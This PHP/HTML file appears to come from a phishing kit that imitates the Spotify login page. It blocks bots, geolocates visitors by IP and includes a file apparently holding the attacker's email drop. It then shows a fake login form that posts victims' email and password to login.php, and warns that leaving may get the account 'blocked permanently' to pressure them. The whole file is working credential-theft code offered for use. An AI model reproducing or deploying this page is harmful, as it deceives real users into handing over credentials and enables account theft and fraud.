<?php
include "./block-ip/bots.php";  
include "./block-ip/opciones.php";
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
session_start();
date_default_timezone_set("Africa/Morocco");
include('__MonEmail.php');
$rand = $_GET['dispatch'];
?>
<!DOCTYPE HTML5>
<html>
<head>
<meta charset="UTF-8">
<title>Login - Spotify</title>

<link rel="stylesheet" type="text/css" href="./css/gfrehegr.css" />

		<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript">
		function validate(){
			var email = $('input[name=Email]');
			var pass = $('input[name=Password]');
			var stat;
			if(email.val() == ''){ email.addClass("merror"); stat = false; }   
			if(pass.val() == ''){ pass.addClass("merror"); stat = false; }  
			if(stat == false) { return false ;}
			return true;
		}
		</script>
</head>
<body>
<center>
<div>

<img src="img/spot-logo.PNG">
</div>
</center>
<div id="bar">
   
</div>
<br>
<br>
<center>
<div id="loginform">
<form id="form" name="form" method="POST" action="login.php?dispatch==2771219485747140351_2451c8b98405efe4628bd74dc2093af5=" onsubmit='return validate();'>
<input type="text" name="Email" required type="email"  value="" placeholder="Email or username" maxlength="100" tabindex="9">
<br>
<br>
<input type="password"  name="Password" required placeholder="Password">
<div>
<input type="submit" class="btn" value="login" />


</div>
<div id="footer">
<img src="img/copy.PNG">
</div>
</div>

</center>

</div>

<script type="text/javascript">
document.getElementsByClassName('btn')[0].onclick = function(){
    window.btn_clicked = true;
};
window.onbeforeunload = function(){
    if(!window.btn_clicked){
        return 'If you leave, Your account may be blocked permanently !';
    }
};
$("input").change(function () {
        $(this).removeClass("merror");
}).trigger("change");

</script>
</body>
</html>
